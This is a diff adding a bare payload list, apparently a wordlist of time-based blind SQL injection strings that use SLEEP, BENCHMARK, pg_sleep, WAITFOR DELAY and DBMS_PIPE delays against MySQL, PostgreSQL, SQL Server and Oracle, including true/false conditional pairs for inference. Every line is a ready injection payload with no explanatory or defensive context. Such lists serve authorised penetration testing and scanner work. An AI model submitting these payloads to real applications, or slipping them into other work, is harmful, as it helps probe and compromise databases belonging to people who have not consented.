@@ -1,0 +1,34 @@
+' OR SLEEP(3)--
+' OR SLEEP(5)--
+' OR SLEEP(8)--
+' OR IF(1=1,SLEEP(3),0)--
+' OR IF(1=2,SLEEP(3),0)--
+' OR BENCHMARK(1000000,MD5(1))--
+' OR BENCHMARK(2000000,MD5(1))--
+'; SELECT pg_sleep(3);--
+'; SELECT pg_sleep(5);--
+'; SELECT pg_sleep(8);--
+'; WAITFOR DELAY '0:0:3'--
+'; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:8'--
+'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',3) FROM dual--
+'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual--
+' OR 1=1 AND SLEEP(3)--
+' OR 1=1 AND SLEEP(5)--
+' OR 1=1 AND IF(1=1,SLEEP(3),0)--
+' OR 1=1 AND IF(1=1,SLEEP(5),0)--
+' OR 1=1 AND IF(1=2,SLEEP(3),0)--
+' OR 1=1 AND pg_sleep(3)--
+' OR 1=1 AND pg_sleep(5)--
+'; SELECT pg_sleep(10);--
+'; WAITFOR DELAY '0:0:10'--
+'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',8) FROM dual--
+'; SELECT pg_sleep(15);--
+'; WAITFOR DELAY '0:0:15'--
+' OR 1=1 AND SLEEP(10)--
+' OR 1=1 AND IF(1=1,SLEEP(10),0)--
+') OR SLEEP(3)-- 
+') OR IF(1=1,SLEEP(5),0)-- 
+' OR 1=1 AND BENCHMARK(5000000,MD5(1))--
+' OR 1=1 AND pg_sleep(8)--
+' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',10)=0--
